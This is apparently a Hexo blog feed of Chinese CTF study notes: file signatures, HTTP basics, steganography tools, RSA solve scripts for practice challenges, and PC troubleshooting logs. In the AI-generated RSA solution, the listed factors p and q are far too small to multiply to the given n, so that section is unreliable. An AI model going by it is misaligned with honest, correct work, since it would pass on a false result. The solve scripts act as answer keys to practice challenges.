00。</p><p>##DOCX 文件/ZIP文件（Microsoft Word 2007+）<br>DOCX 文件是基于 XML 的文件格式。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 4B 03 04 ...</span><br></pre></td></tr></table></figure><p>这个签名表示 ZIP 压缩文件格式，因为 DOCX 文件实际上是 ZIP 压缩的 XML 文件。<br>文件尾通常以 ZIP 文件的结束标记结束：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">... 50 4B 05 06</span><br></pre></td></tr></table></figure><p>##TXT 文件<br>没有固定的文件头，因为只是纯文本文件，有些文本文件可能以特定的字符编码（如 UTF-8）开始：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EF BB BF ...</span><br></pre></td></tr></table></figure><p>这是 UTF-8 编码的字节顺序标记（BOM）。<br>通常没有固定的文件尾。</p><p>##MOV 视频文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 14 66 74 79 70 71 74 20 20 ...</span><br></pre></td></tr></table></figure><p>66 74 79 70 对应 ASCII 编码的 ftyp，表示文件类型。<br>文件尾没有固定的模式，但通常包含结束标记，如 6D 64 61 74（mdat）。</p><p>##MP4 视频文件<br>MP4 文件的文件头与 MOV 文件类似，也以 ftyp 开头，但后续字节可能有所不同：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 18 66 74 79 70 6D 70 34 32 ...</span><br></pre></td></tr></table></figure><p>6D 70 34 32 对应 ASCII 编码的 mp42，表示 MPEG-4 第2版。<br>文件尾没有固定的模式，但通常包含结束标记，如 6D 64 61 74（mdat）。</p><hr><p>©著作权归作者所有：来自51CTO博客作者陈锋爱吃菠萝的原创作品，请联系作者获取转载授权，否则将追究法律责任（联系中）<br>十六进制文件头和文件尾：文件取证和恢复的关键<br><a href="https://blog.51cto.com/u_15763679/11200825">https://blog.51cto.com/u_15763679/11200825</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf 碎片知识整理</title>
      <link href="/2025/08/16/ctf-%E7%A2%8E%E7%89%87%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
      <url>/2025/08/16/ctf-%E7%A2%8E%E7%89%87%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9">零碎知识点</a><ul><li><a href="#1-http%E8%AF%B7%E6%B1%82%E5%8C%85%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF">1. HTTP请求包（浏览器信息）</a></li><li><a href="#2-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3error-externally-managed-environment">2. 报错解决：error: externally-managed-environment</a></li><li><a href="#3-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3einvalid-opertion-install">3. 报错解决：E：invalid opertion install</a></li><li><a href="#4-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4kali%E8%BF%9B%E5%85%A5%E9%80%80%E5%87%BAroot%E5%91%BD%E4%BB%A4">4. 常用命令：【kali】进入退出root命令</a></li><li><a href="#5-%E9%9B%B6%E5%AE%BD%E9%9A%90%E5%86%99">5. 零宽隐写</a></li></ul></li></ul><h1>零碎知识点</h1><h2 id="1-HTTP请求包（浏览器信息）"><a class="header-anchor" href="#1-HTTP请求包（浏览器信息）">¶</a>1. HTTP请求包（浏览器信息）</h2><p>我们先看看Request包的结构, Request包分为3部分，第一部分叫Request line（请求行）, 第二部分叫Request header（请求头）,第三部分是body（主体）。header和body之间有个空行，请求包的例子所示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET//请求行: 请求方法 请求URL HTTP协议/协议版本</span><br><span class="line">Host：//服务端的主机名</span><br><span class="line">User-Agent：//浏览器信息</span><br><span class="line">Accept：//客户端能接收的MIME</span><br><span class="line">Accept-Encoding：//是否支持流压缩</span><br><span class="line">Accept-Charset：//客户端字符编码集</span><br><span class="line">//空行,用于分割请求头和消息体</span><br><span class="line">//消息体,请求资源参数,例如POST传递的参数</span><br></pre></td></tr></table></figure><p>HTTP协议定义了很多与服务器交互的请求方法，最基本的有4种，分别是GET,POST,PUT,DELETE。一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，增，改，删4个操作。我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息。</p><p>GET和POST的区别:</p><blockquote><ol><li>我们可以看到GET请求消息体为空，POST请求带有消息体。</li><li>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456。POST方法是把提交的数据放在HTTP包的body中。</li><li>GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制。</li><li>GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码</li></ol></blockquote><p>HTTP响应包（服务器信息）<br>我们再来看看HTTP的response包，他的结构如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK//状态行</span><br><span class="line">Server: nginx/1.0.8//服务器使用的WEB软件名及版本</span><br><span class="line">Date:Date: Tue, 30 Oct 2012 04:14:25 GMT//发送时间</span><br><span class="line">Content-Type: text/html//服务器发送信息的类型</span><br><span class="line">Transfer-Encoding: chunked//表示发送HTTP包是分段发的</span><br><span class="line">Connection: keep-alive//保持连接状态</span><br><span class="line">Content-Length: 90//主体内容长度</span><br><span class="line">//空行 用来分割消息头和主体</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;... //消息体</span><br></pre></td></tr></table></figure><p>Response包中的第一行叫做状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。<br>状态码用来告诉HTTP客户端,HTTP服务器是否产生了预期的Response。<br>HTTP/1.1协议中定义了5类状态码， 状态码由三位数字组成，第一个数字定义了响应的类别</p><blockquote><p>1XX 提示信息 - 表示请求已被成功接收，继续处理<br>2XX 成功 - 表示请求已被成功接收，理解，接受<br>3XX 重定向 - 要完成请求必须进行更进一步的处理<br>4XX 客户端错误 - 请求有语法错误或请求无法实现<br>5XX 服务器端错误 - 服务器未能实现合法的请求<br>————————————————<br>版权声明：本文为CSDN博主「hespecial」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/m0_50376770/article/details/132438222">https://blog.csdn.net/m0_50376770/article/details/132438222</a></p></blockquote><h2 id="2-报错解决：error-externally-managed-environment"><a class="header-anchor" href="#2-报错解决：error-externally-managed-environment">¶</a>2. 报错解决：error: externally-managed-environment</h2><p>方法1：安装venv虚拟环境（网上推荐但失败）<br>方法2：安装pipx，成功但使用不便<br>方法3：强行避免报错<br>具体：<br>原来安装代码：pip install 对象名<br>现在安装代码：pip install --break-system-packages 对象名</p><h2 id="3-报错解决：E：invalid-opertion-install"><a class="header-anchor" href="#3-报错解决：E：invalid-opertion-install">¶</a>3. 报错解决：E：invalid opertion install</h2><p>更换源代码：<br>sudo add-apt-repository main<br>sudo add-apt-repository universe<br>sudo add-apt-repository restricted<br>sudo add-apt-repository multiverse<br>sudo apt-get update</p><h2 id="4-常用命令：【kali】进入退出root命令"><a class="header-anchor" href="#4-常用命令：【kali】进入退出root命令">¶</a>4. 常用命令：【kali】进入退出root命令</h2><p>设置root密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><p>进入root：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p>退出root：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su 用户名</span><br></pre></td></tr></table></figure><h2 id="5-零宽隐写"><a class="header-anchor" href="#5-零宽隐写">¶</a>5. 零宽隐写</h2><p><a href="https://tool.bfw.wiki/tool/1695021695027599.html">https://tool.bfw.wiki/tool/1695021695027599.html</a><br>注意：用ctrl+A复制</p>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc 笔记</title>
      <link href="/2025/08/13/misc-%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/08/13/misc-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>目录：</p><ul><li><a href="#sstv">sstv</a></li></ul><h2 id="sstv"><a class="header-anchor" href="#sstv">¶</a>sstv</h2><ol><li>下载方法：pip install sstv<br>使用方法：<br>wav音频文件放到sstv根目录（C:\Windows\System32\sstv），打开cmd，输入</li></ol><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> sstv</span><br><span class="line">sstv -d 文件名.wav -o result.png#输出图片名</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>RX-SSTV解码软件<br>下载地址：<a href="https://www.qsl.net/on6mu/rxsstv.htm">https://www.qsl.net/on6mu/rxsstv.htm</a><br>虚拟声卡e2eSoft<br>由于SSTV工具是根据音频传递图片信息，正常解法需要一台设备播放一台设备收音，所以需要一个虚拟声卡，还能避免杂音的干扰。<br>下载地址：<a href="https://www.e2esoft.cn/vsc/">https://www.e2esoft.cn/vsc/</a><br><img src="/img/misc-%E7%AC%94%E8%AE%B0_sstv.jpeg" alt="alt text"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件下载方法存档</title>
      <link href="/2025/08/12/%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%E5%AD%98%E6%A1%A3/"/>
      <url>/2025/08/12/%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%E5%AD%98%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>软件名：yaki<br>用途：ctf web<br>下载官网：<a href="https://yaklang.com/">https://yaklang.com/</a><br>使用文档：<a href="https://yaklang.io/products/intro/">https://yaklang.io/products/intro/</a></p><p><img src="/img/%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%E5%AD%98%E6%A1%A3_yaki.jpeg" alt="alt text"><br>软件名：QRresearch<br>用途：ctf misc<br>下载地址：<a href="https://wwws.lanzouy.com/iRLUn11jc12h%E6%88%96%E8%80%85%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%94%B5%E8%84%91%E5%AD%98%E6%A1%A3%E6%96%87%E4%BB%B6%E5%A4%B9%E5%86%85%E8%8E%B7%E5%8F%96">https://wwws.lanzouy.com/iRLUn11jc12h或者百度网盘电脑存档文件夹内获取</a></p>]]></content>
      
      
      <categories>
          
          <category> 存档 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 存档 </tag>
            
            <tag> 新电脑部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSB隐写题目解法</title>
      <link href="/2025/08/11/LSB%E9%9A%90%E5%86%99%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%B3%95/"/>
      <url>/2025/08/11/LSB%E9%9A%90%E5%86%99%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/LSB%E9%9A%90%E5%86%99%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%B3%95_LSB.jpg" alt="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> LSB </tag>
            
            <tag> 图片隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsa 初步学习笔记</title>
      <link href="/2025/08/09/rsa-%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/08/09/rsa-%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>1 因数，质数，余数</p><p>2 公钥，私钥<br>1）制作过程：<br><img src="/img/rsa-%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_4.png" alt="alt text"><br>2） 实际操作过程：<br><img src="/img/rsa-%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5.png" alt="alt text"></p><p>3 工具<br>1）<a href="https://factordb.com/">https://factordb.com/</a><br>分解n工具，注意！！！点数字后就到上方框里了可以复制！！！（有点愚蠢但愚蠢的人没发现</p><p><strong><strong>具体题目：</strong></strong><br>· 来源：spc学长xc<br>基础rsa，在python中使用inverse()函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#from Crypto.Util.number import *</span><br><span class="line">#from secret import flag</span><br><span class="line">#m = bytes_to_long(flag)</span><br><span class="line">#p = getPrime(512)</span><br><span class="line">#q = getPrime(512)</span><br><span class="line">#e = 65537</span><br><span class="line">#n = p*q</span><br><span class="line">#c = pow(m,e,n)</span><br><span class="line">#print(f&#x27;p = &#123;p&#125;&#x27;)</span><br><span class="line">#print(f&#x27;q = &#123;q&#125;&#x27;)</span><br><span class="line">#print(f&#x27;c = &#123;c&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073</span><br><span class="line">q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451</span><br><span class="line">c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057</span><br><span class="line"></span><br><span class="line">#最终解决方法：</span><br><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line">e = 65537          </span><br><span class="line">n = p * q</span><br><span class="line">t = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, t)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag.decode())   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>· 来源：spc学长xc<br>题目提示：大数N的分解<br>题目：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from serct import flag</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = 65537</span><br><span class="line">c = powmod(m, e, n)#加密结果    </span><br><span class="line">print(n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"># 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span><br><span class="line"># 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span><br></pre></td></tr></table></figure><p>AI解法：<br>拿到题目后，我们手里只有n ，c ，e，但没有 p 和 q ，所以第一步就是分解 n。</p><ol><li>先直接上 yafu / factordb<br>（注意！！！分解时要求P*Q=N，且注意P跟Q的bit特征，在此题当中只有512bit）</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 72224896773450610791657349018700642791668283264384520670702825479122904864127</span><br><span class="line">q = 72224896773450610791657349018700642791668283264384520670702825479122904864239</span><br></pre></td></tr></table></figure><p>（这两个数只差 112，所以 yafu 的 ECM / SIQS 都能秒破。）（yafu下载后卡死【待解决】</p><ol start="2"><li>有了 p、q，就能算私钥 d</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">n = 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span><br><span class="line">c = 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">p = 72224896773450610791657349018700642791668283264384520670702825479122904864127</span><br><span class="line">q = 72224896773450610791657349018700642791668283264384520670702825479122904864239</span><br><span class="line"></span><br><span class="line">assert p * q == n</span><br><span class="line">#校验等式是否成立</span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)#欧拉函数</span><br><span class="line">d = invert(e, phi)#e*d≡1mod phi</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>（这题就是典型的“p、q 距离太近”导致用 Fermat 方法或 ECM 就能秒分解。）（这两个方法是什么？</p><p>· 来源：spc学长xc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(b&#x27;flag&#123;******&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">r = getPrime(512)</span><br><span class="line"># 分别独立地生成 3 个 512 bit（≈154 位十进制）的随机强素数 p、q、r。这三个素数就是后面多素数 RSA 的因子。</span><br><span class="line"></span><br><span class="line">h1 = 1*p + 1*q + 1*r</span><br><span class="line">h2 = 2*p + 3*q + 3*r</span><br><span class="line">h3 = 9*p + 9*q + 6*r</span><br><span class="line">print( &quot;hint_of_pqr=&quot; , h1 , h2 , h3 )</span><br><span class="line"># h1,h2,h3可求出pqr的值</span><br><span class="line"></span><br><span class="line">e = getPrime(64)</span><br><span class="line"># 生成一个 64 bit 的随机素数 e，用作 RSA 公钥指数。</span><br><span class="line"></span><br><span class="line">a_big_prime = getPrime( 512 )</span><br><span class="line"># 再生成一个 512 bit 的随机素数，起名叫 `a_big_prime`。</span><br><span class="line"># 注意：这个名字有误导性，它并不是 RSA 模数 N 的因子，只是额外生成的一个素数，用来产生另一条“hint”（？什么鬼</span><br><span class="line"></span><br><span class="line">hint = pow(a_big_prime,e,2**512)</span><br><span class="line">#计算</span><br><span class="line"># pow（a,b,c）=（a^b）%c</span><br><span class="line"># 在 CTF 语境里，这往往暗示“partial key exposure”——低 512 位泄漏</span><br><span class="line"># 攻击者可用 Coppersmith/Howgrave-Graham lattice 方法恢复完整私钥。</span><br><span class="line"># 不过本题真正解密不需要它，因为 e 很小且 n 的因子我们已能求出。</span><br><span class="line"></span><br><span class="line">print( &quot;the big prime is: &quot; , a_big_prime )</span><br><span class="line">print( &quot;hint is:&quot; , hint )</span><br><span class="line"></span><br><span class="line">n = p*q*r</span><br><span class="line"># 构造一个 3 素数 RSA 模数 n，长度 3×512 = 1536 bit。</span><br><span class="line">c = pow( m , e , n )</span><br><span class="line">print( &quot;c=&quot; , c )</span><br><span class="line"># 输出密文 c</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">hint_of_pqr= 26205997351166240405785097231436009350807507606268828636742615246287109077466822241186639293389573242216311668227098054599788791116215571416316140409352427</span><br><span class="line">66860315641471130491119218972922785980480599406983109647358601581641695642878472456945137024883369147959034865118793676633880997281324220353834323524635144 213473629205254382083617791480463504155040467378518856042962121442859026373709762896295778597714884481459316375098621436229734548467857563069831689551454946</span><br><span class="line">the big prime is:  11557301053448817361014126921662226367639845395602185765021724910056663884113570410496382266851427507275779260616871464855286322325118092388982283547918921</span><br><span class="line">hint is: 10271913433365953528187318472631779008104540530202414129752768330046395509900224800993688431964630907432047820727638055487310601524087956924122431108238505</span><br><span class="line">c= 116569284047193403361251336983936346094224289856857789287062750599584928427772025697885153355908857327470083147465892652988245017837819503727301904206404536314951181113506280048949514352483259762138034268916332027429633274027588317302925270485836816591363962835119659624022139707163858477460375467148571163549410771927644341667962740112294140641187548649921303016157469076294782957230926056116058301134087751871726212821846406513780951057663400249479830993970711</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>自己解出来了但方法过于复杂，无参考价值，所以只保留学长wp作为存档。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Cryptodome.Util.number import long_to_bytes as l2b</span><br><span class="line">import sympy</span><br><span class="line"></span><br><span class="line">h1 =  26205997351166240405785097231436009350807507606268828636742615246287109077466822241186639293389573242216311668227098054599788791116215571416316140409352427</span><br><span class="line">h2 =  66860315641471130491119218972922785980480599406983109647358601581641695642878472456945137024883369147959034865118793676633880997281324220353834323524635144</span><br><span class="line">h3 =  213473629205254382083617791480463504155040467378518856042962121442859026373709762896295778597714884481459316375098621436229734548467857563069831689551454946</span><br><span class="line">a_big_prime =   11557301053448817361014126921662226367639845395602185765021724910056663884113570410496382266851427507275779260616871464855286322325118092388982283547918921</span><br><span class="line">hint =  10271913433365953528187318472631779008104540530202414129752768330046395509900224800993688431964630907432047820727638055487310601524087956924122431108238505</span><br><span class="line">c= 116569284047193403361251336983936346094224289856857789287062750599584928427772025697885153355908857327470083147465892652988245017837819503727301904206404536314951181113506280048949514352483259762138034268916332027429633274027588317302925270485836816591363962835119659624022139707163858477460375467148571163549410771927644341667962740112294140641187548649921303016157469076294782957230926056116058301134087751871726212821846406513780951057663400249479830993970711</span><br><span class="line">#解方程</span><br><span class="line">p = 3*h1 - h2</span><br><span class="line">r = (9*h1 - h3)//3</span><br><span class="line">q = h1 - p -r</span><br><span class="line"></span><br><span class="line">#解e</span><br><span class="line">e = sympy.discrete_log(2**512,hint,a_big_prime)</span><br><span class="line"></span><br><span class="line">#rsa算法</span><br><span class="line">n = p*q*r</span><br><span class="line">fain = (p-1)*(q-1)*(r-1)</span><br><span class="line">d = pow(e,-1,fain)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(l2b(m))</span><br></pre></td></tr></table></figure><ul><li>后续笔记见<a href="/2025/10/18/bilibili%E9%80%9F%E6%88%90crypto%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">bilibili速成crypto视频学习笔记</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf writeup</title>
      <link href="/2025/08/09/ctf-%E9%9B%B6%E6%95%A3writeup/"/>
      <url>/2025/08/09/ctf-%E9%9B%B6%E6%95%A3writeup/</url>
      
        <content type="html"><![CDATA[<p>2025-08-09<br>题目类型：misc<br>题目来源：spc学长sq<br>解决步骤：<br>1 虚拟机VMware + kali linux中的binwalk工具，使用-e命令分解文件，得到缺三角的二维码<br>2 图片编辑补齐三角<br>3 扫码获得文本，使用社会主义核心价值观编码解开获得flag<br>反思：<br>难点主要只是工具配置和方向，所以还是要多问（笑）</p><p>2025-10-15<br>要注意文件可以与文字xor!!!</p><p><img src="/img/ctf-%E9%9B%B6%E6%95%A3writeup_9.png" alt="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电脑求助存档</title>
      <link href="/2025/08/07/%E7%94%B5%E8%84%91%E6%B1%82%E5%8A%A9%E5%AD%98%E6%A1%A3/"/>
      <url>/2025/08/07/%E7%94%B5%E8%84%91%E6%B1%82%E5%8A%A9%E5%AD%98%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>2025-08-03<br><strong><strong>问题：openlist挂载卡在使用raildrive mount进行其集成网盘映射至本地文件夹一步</strong></strong><br>解决：取消勾选网络<a href="https://xn--483a49n">https://选项</a><br>反思：看攻略不够仔细，攻略中有这一步漏了</p><p>2025-08-03<br><strong><strong>问题：openlist自启动文件失败</strong></strong><br>解决：没有放在同级文件夹<br>反思：自动文件如.bat后缀文件，需要注意是否有放置位置要求</p><p>2025-08-03<br><strong><strong>问题：桌面出现观看视频名称，具体表现为网页观看任一视频出现名称在桌面左上角，且位于fence分类界面下方</strong></strong><br>解决：是wallpaper engine的壁纸问题，具体原因不清楚，有大佬怀疑壁纸随音乐律动模块把媒体控件拉过来了<br>反思：一开始一个个关闭桌面美化软件来确定问题来源时，漏了壁纸</p><hr>]]></content>
      
      
      <categories>
          
          <category> 存档 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于笔者</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="作者联系方式"><a class="header-anchor" href="#作者联系方式">¶</a>作者联系方式</h2><ul><li>邮箱：yluo3383@gmail.com</li></ul><h2 id="关于本站"><a class="header-anchor" href="#关于本站">¶</a>关于本站</h2><ul><li>框架：Hexo + GitHub + Butterfly</li></ul><p>如果你对本站有任何建议或发现链接失效、内容问题，欢迎在评论区留言或通过邮箱联系我。谢谢来访！</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>留言板</title>
      <link href="/messageboard/index.html"/>
      <url>/messageboard/index.html</url>
      
        <content type="html"><![CDATA[<div class="msgboard">  <h2>最新评论（全站）</h2>  <div id="recent-comments" class="recent-comments"></div>  <div class="recent-actions"><button id="load-more" class="load-more">加载更多</button></div>  <div id="twikoo-wrap" class="twikoo-wrap"></div></div><style>.msgboard { padding: 12px; }.recent-comments { max-height: 420px; overflow-y: auto; padding-right: 8px; }.tk-comment { display: flex; gap: 12px; padding: 10px 0; border-bottom: 1px dashed var(--text-color, #999); }.tk-avatar { width: 40px; height: 40px; flex: 0 0 40px; border-radius: 50%; overflow: hidden; }.tk-avatar img { width: 100%; height: 100%; object-fit: cover; }.tk-main { flex: 1 1 auto; }.tk-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }.tk-nick { font-weight: 600; line-height: 1.4; }.tk-content { line-height: 1.6; word-break: break-word; }.tk-footer { display: flex; justify-content: flex-end; align-items: center; gap: 10px; margin-top: 6px; color: var(--text-color, #666); font-size: 0.9em; }.tk-footer .tk-time { opacity: 0.85; }.tk-footer .tk-link { text-decoration: none; }.recent-actions { display: flex; justify-content: flex-end; margin-top: 6px; }.load-more { display: inline-block; padding: 4px 10px; font-size: 0.85em; border: 1px solid var(--text-color, #999); border-radius: 4px; background: var(--card-bg, transparent); color: var(--text-color, #666); cursor: pointer; }.load-more:hover { background: rgba(0,0,0,0.05); }.load-more:disabled { opacity: 0.6; cursor: not-allowed; }</style><script>(function(){  const envId = 'https://twikoo-vercel01.vercel.app';  const titleCache = new Map();  let displayedCount = 10; // 初始显示 10 条  let cacheList = [];      // 最近一次获取的列表缓存  let isLoadingMore = false;  let fullList = [];       // 缓存最多 50 条，供“加载更多”使用  function escapeHTML(html){    const div = document.createElement('div');    div.textContent = html == null ? '' : String(html);    return div.innerHTML;  }  function sanitizeContent(str){    if (!str) return '';    let s = String(str);    // 如果出现 <div 或 &lt;div，直接截断至该位置，后面的页面内容全部不要    const idxRealDiv = s.search(/<div\b/i);    const idxEscDiv = s.search(/&lt;div\b/i);    const cutIdx = (idxRealDiv >= 0 && idxEscDiv >= 0) ? Math.min(idxRealDiv, idxEscDiv) : (idxRealDiv >= 0 ? idxRealDiv : idxEscDiv);    if (cutIdx >= 0) s = s.slice(0, cutIdx);    // 统一换行    s = s.replace(/<br\s*\/?>(\r\n|\n)?/gi, '\n');    // 移除整段 div（真实标签），包含内部内容（截断后理论上不再出现，但保留以防万一）    s = s.replace(/<div(?:\s[^>]*)?>[\s\S]*?<\/div>/gi, '');    // 移除整段 div（已转义标签），包含内部内容（防御性保留）    s = s.replace(/&lt;div(?:\s[^&]*)&gt;[\s\S]*?&lt;\/div&gt;/gi, '');    // 移除常见标签本身（保留内部内容）：p/hr/span/i（真实）    s = s.replace(/<\/?(p|hr|span|i)[^>]*>/gi, '');    // 移除其他真实 HTML 标签（保留文本）    s = s.replace(/<[^>]+>/g, '');    // 移除常见标签的已转义形式（保留内部内容）    s = s.replace(/&lt;\/?(p|hr|span|i)[^&]*&gt;/gi, '');    // 移除其他已转义 HTML 标签    s = s.replace(/&lt;[^&]+&gt;/g, '');    // 额外移除纯文本关键词“div”（大小写不敏感，独立词）    s = s.replace(/\bdiv\b/gi, '');    // 转义并将换行还原为 <br>    